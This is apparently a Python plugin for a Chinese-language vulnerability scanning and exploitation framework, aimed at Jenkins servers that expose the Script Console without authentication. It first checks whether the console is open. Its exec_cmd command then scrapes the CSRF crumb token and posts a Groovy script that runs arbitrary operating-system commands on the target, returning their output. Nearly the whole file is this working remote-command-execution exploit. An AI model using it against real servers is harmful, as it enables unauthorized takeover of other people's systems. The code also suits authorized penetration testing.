# -*-* coding:UTF-8
import re
import lxml.etree
import urllib.parse


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "name": "Jenkins未授权访问漏洞",
        "description": "",
    }

    def url(self) -> dict:
        r = self.request(
            method='get',
            path='./script',
            timeout=15
        )
        if r.status_code == 200 and 'Script Console' in r.text:
            return {
                "LoopholeInfo": {"app": "Jenkins", "name": "Jenkins未授权访问漏洞"}
            }

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        r = self.request(
            method='get',
            url=urllib.parse.urljoin(url, './'),
            timeout=15
        )
        if r.status_code == 200:
            match = re.search(rf'data-crumb-value="(\w+)"', r.text)
            if match:
                token = match.group(1)
                r = self.request(
                    method='post',
                    url=urllib.parse.urljoin(url, './script'),
                    timeout=15,
                    data=f"script=println+%22{cmd}%22.execute%28%29.text&Jenkins-Crumb={token}&Submit=Run",
                )
                if r.status_code == 200:
                    dom = lxml.etree.HTML(r.text)
                    match = dom.xpath('/html/body/div[2]/div[2]/pre[2]/text()')
                    if match:
                        res = match[0]
                        if 'No such file or directory' not in res:
                            self.log.sucess(f'命令执行结果: {res}')
                        else:
                            self.log.failure(f'命令执行失败')
            else:
                self.log.warn('无法获取Jenkins-Crumb')
        else:
            self.log.warn('目标无法访问')